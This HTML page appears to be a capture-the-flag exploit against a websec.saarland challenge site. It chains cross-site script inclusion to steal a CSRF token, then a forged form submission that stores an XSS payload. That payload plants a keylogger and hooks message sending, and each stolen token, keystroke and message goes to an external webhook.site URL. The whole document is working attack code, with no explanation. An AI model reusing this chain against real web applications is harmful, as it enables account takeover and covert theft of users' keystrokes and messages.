<!DOCTYPE html>
<html>
<head><title>Verify</title></head>
<body>
    <form id="dummy"></form>
    <form id="csrf_form" action="https://diary.owley-madison.jeopardy.websec.saarland/entry" method="POST" target="ifr">
        <input type="hidden" name="content" id="c">
        <input type="hidden" name="csrfmiddlewaretoken" id="t">
    </form>
    <iframe name="ifr" style="display:none;"></iframe>

    <!-- The XSSI Script -->
    <script src="https://owley-madison.jeopardy.websec.saarland/csrf_script.js"></script>

    <script>
        const WEBHOOK = "https://webhook.site/3edd777c-81ed-4ac7-9380-bf960ab73bd2";
        
        // --- STEP 1: Ping to see if bot reached GitHub ---
        new Image().src = `${WEBHOOK}/?step=1_reached_github`;

        window.onload = function() {
            try {
                const tokenInput = document.forms[0].querySelector('input[name="csrfmiddlewaretoken"]');
                if (!tokenInput || !tokenInput.value) {
                    new Image().src = `${WEBHOOK}/?step=ERROR_no_token_found`;
                    return;
                }

                const token = tokenInput.value;
                new Image().src = `${WEBHOOK}/?step=2_token_stolen&token=${token}`;

                // --- STEP 2: The Payload ---
                // We use a simpler payload first to verify execution
                const xss = `<script>
                    document.domain = "owley-madison.jeopardy.websec.saarland";
                    var i = document.createElement('iframe');
                    i.src = "//match.owley-madison.jeopardy.websec.saarland/";
                    document.body.appendChild(i);
                    i.onload = function() {
                        var p = "yassinmedhat</option><img src=x onerror=\\"document.domain='owley-madison.jeopardy.websec.saarland';parent.document.addEventListener('keyup',e=>{new Image().src='${WEBHOOK}/?k='+e.key});var s=parent.send_message;parent.send_message=()=>{new Image().src='${WEBHOOK}/?f='+parent.document.getElementById('message').value;s()};\\">";
                        i.contentWindow.localStorage.setItem('favorites', JSON.stringify([p]));
                        location.href = "//chat.owley-madison.jeopardy.websec.saarland/";
                    };
                <\/script>`;

                document.getElementById('t').value = token;
                document.getElementById('c').value = xss;

                // --- STEP 3: Fire CSRF ---
                document.getElementById('csrf_form').submit();
                new Image().src = `${WEBHOOK}/?step=3_csrf_submitted`;

                // --- STEP 4: Redirect to Trigger ---
                setTimeout(() => {
                    new Image().src = `${WEBHOOK}/?step=4_final_redirect`;
                    window.location.href = "https://diary.owley-madison.jeopardy.websec.saarland/";
                }, 1000);

            } catch (err) {
                new Image().src = `${WEBHOOK}/?step=JS_ERROR&msg=${encodeURIComponent(err)}`;
            }
        };
    </script>
</body>
</html>
